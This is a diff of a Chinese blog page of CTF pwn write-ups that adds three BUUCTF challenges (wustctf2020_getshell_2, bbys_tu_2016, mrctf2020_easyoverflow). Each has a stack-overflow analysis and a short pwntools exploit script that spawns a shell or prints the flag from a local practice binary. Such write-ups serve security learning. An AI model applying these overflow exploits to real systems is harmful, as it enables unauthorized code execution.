@@ -68,8 +68,27 @@
 <meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240221211348886.png">
 <meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240221211716815.png">
 <meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240221214904809.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222142935316.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222141319813.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222141707599.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222165130750.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222142906055.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222142752095.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222170153103.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222170646929.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222170635342.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222170318191.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222170602260.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222172724756.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222172830030.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222173647612.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222172231146.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222174101479.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222174227220.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222174555033.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240222180124672.png">
 <meta property="article:published_time" content="2024-02-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-21T14:07:30.884Z">
+<meta property="article:modified_time" content="2024-02-22T10:09:02.061Z">
 <meta property="article:author" content="shy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218104334527.png">
@@ -121,7 +140,7 @@
                                                总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">68.3k</span>
+	总字数 <span class="post-count">68.7k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -219,7 +238,7 @@
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：2k字 | 预计阅读时长：9分钟
+    字数：2.4k字 | 预计阅读时长：11分钟
 </div>
         
   
@@ -424,6 +443,58 @@
 
 <p>成功</p>
 <p><img src="/2024/02/18/buuctf-pwn/image-20240221214904809.png"></p>
+<h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h2><p>ida查看</p>
+<p>漏洞函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222142935316.png"></p>
+<p>存在shell，但是不是&#x2F;bin&#x2F;sh，但是system(sh)也是可以的，查看system和sh地址</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222141319813.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222141707599.png"></p>
+<p><code>sh=0x08048670</code></p>
+<p>或者<code>ROPgadget --binary wustctf2020_getshell_2 --string &#39;sh&#39;</code>查找</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222165130750.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222142906055.png"></p>
+<p>但没法利用<code>system@plt</code>地址，因为plt地址需要返回值，可溢出的地址位数不够<code>0x24-0x18=0xc</code>，所以只能用<code>shell()</code>里的<code>call system</code>来调用system，call函数不用返回值了，它会自己把下一条指令给压进去</p>
+<p>也就是说如果是plt，payload是<code>b&#39;p&#39;*0x1c+p32(0x8048529)+p32(retrurn_addr)+p32(sh_addr)</code>溢出就不够了而call_system则是<code>b&#39;p&#39;*0x1c+p32(0x8048529)+p32(sh_addr)</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222142752095.png"></p>
+<p><code>system_addr=08048529</code></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./wustctf2020_getshell_2&#x27;</span>)</span><br><span class="line">sh=<span class="number">0x08048670</span></span><br><span class="line">call_system=<span class="number">0x08048529</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_system) + p32(sh)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222170153103.png"></p>
+<h2 id="bbys-tu-2016"><a href="#bbys-tu-2016" class="headerlink" title="bbys_tu_2016"></a>bbys_tu_2016</h2><p>查看保护</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222170646929.png"></p>
+<p>32位程序，运行一下</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222170635342.png"></p>
+<p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222170318191.png"></p>
+<p><code>__isoc99_scanf</code>溢出</p>
+<p>存在打印flag的函数</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222170602260.png"></p>
+<p>溢出试一下</p>
+<p>调试发现ida显示的偏移不准，gdb调试一下发现是<code>20+4</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222172724756.png"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bbys_tu_2016&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">win_addr = <span class="number">0x0804856D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p32(win_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222172830030.png"></p>
+<p>成功打印</p>
+<h2 id="mrctf2020-easyoverflow"><a href="#mrctf2020-easyoverflow" class="headerlink" title="mrctf2020_easyoverflow"></a>mrctf2020_easyoverflow</h2><p><img src="/2024/02/18/buuctf-pwn/image-20240222173647612.png"></p>
+<p>保护全开，考虑利用程序自身的代码</p>
+<p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222172231146.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222174101479.png"></p>
+<p>关键在于<code>check</code>函数中,只要<code>a1(v5) == fake_flag</code>就可以得到<code>shell</code></p>
+<p><code>fake_flag = n0t_r3@11y_f1@g</code></p>
+<p> <img src="/2024/02/18/buuctf-pwn/image-20240222174227220.png"></p>
+<p>想到构造<code>payload</code>通过填充<code>v4</code>的空间溢出到<code>v5</code>进而控制<code>v5</code>变量的内容</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222174555033.png"></p>
+<p>两者相差<code>0x70-0x40 = 0x30</code></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_easyoverflow&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">48</span>+<span class="string">b&#x27;n0t_r3@11y_f1@g\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240222180124672.png"></p>
 
       
 
@@ -546,7 +617,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%88%B7%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">PWN刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">1.2.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level4"><span class="toc-number">1.3.</span> <span class="toc-text">jarvisoj_level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-buffer-overflow-1"><span class="toc-number">1.4.</span> <span class="toc-text">picoctf_2018_buffer overflow_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inndy-rop"><span class="toc-number">1.5.</span> <span class="toc-text">inndy_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN1"><span class="toc-number">1.6.</span> <span class="toc-text">[Black Watch 入群题]PWN1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-test-your-memory"><span class="toc-number">1.7.</span> <span class="toc-text">jarvisoj_test_your_memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-buffer-overflow-2"><span class="toc-number">1.8.</span> <span class="toc-text">picoctf_2018_buffer overflow_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-simplerop"><span class="toc-number">1.9.</span> <span class="toc-text">cmcc_simplerop</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%88%B7%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">PWN刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">1.2.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level4"><span class="toc-number">1.3.</span> <span class="toc-text">jarvisoj_level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-buffer-overflow-1"><span class="toc-number">1.4.</span> <span class="toc-text">picoctf_2018_buffer overflow_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inndy-rop"><span class="toc-number">1.5.</span> <span class="toc-text">inndy_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN1"><span class="toc-number">1.6.</span> <span class="toc-text">[Black Watch 入群题]PWN1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-test-your-memory"><span class="toc-number">1.7.</span> <span class="toc-text">jarvisoj_test_your_memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-buffer-overflow-2"><span class="toc-number">1.8.</span> <span class="toc-text">picoctf_2018_buffer overflow_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-simplerop"><span class="toc-number">1.9.</span> <span class="toc-text">cmcc_simplerop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wustctf2020-getshell-2"><span class="toc-number">1.10.</span> <span class="toc-text">wustctf2020_getshell_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bbys-tu-2016"><span class="toc-number">1.11.</span> <span class="toc-text">bbys_tu_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-easyoverflow"><span class="toc-number">1.12.</span> <span class="toc-text">mrctf2020_easyoverflow</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
